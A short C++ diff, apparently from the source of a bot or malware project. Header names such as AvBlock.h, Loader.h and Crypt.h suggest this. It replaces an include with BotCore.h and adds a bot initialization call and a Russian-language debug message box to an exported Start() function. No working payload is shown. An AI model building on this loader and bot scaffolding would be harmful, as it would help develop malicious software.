@@ -15,7 +15,7 @@
 #include "BotEvents.h"
 #include "Loader.h"
 #include "Config.h"
-#include "AvBlock.h"
+#include "BotCore.h"
 
 
 #include "Crypt.h"
@@ -187,7 +187,10 @@ DWORD WINAPI StartThreadProc(LPVOID)
 
 extern"C"  void WINAPI Start()
 {
-	MessageBoxA(NULL, "Присоедините среду к процессу", NULL, 0);
+	BOT::Initialize();
+	string Msg;
+	Msg.Format("Присоедините среду к процессу %s", Bot->ApplicationName().t_str());
+	MessageBoxA(NULL, Msg.t_str(), NULL, 0);
 
 	 
 	Config::SetFileName("c:\\config\\config.bin");
